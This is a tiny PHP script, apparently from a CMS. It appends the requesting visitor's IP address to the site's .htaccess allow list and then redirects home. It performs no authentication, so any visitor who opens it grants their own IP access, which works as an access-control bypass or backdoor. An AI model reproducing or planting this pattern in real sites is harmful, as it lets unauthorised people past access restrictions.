<?
include ("engine/kernel.php");
$ip = get_user_ip();

// echo file_get_contents('.htaccess') ;

$f = fopen(".htaccess", "a+");
fwrite($f, "\nallow from {$ip}");
fclose($f);

cms_redirect_page("/");
?>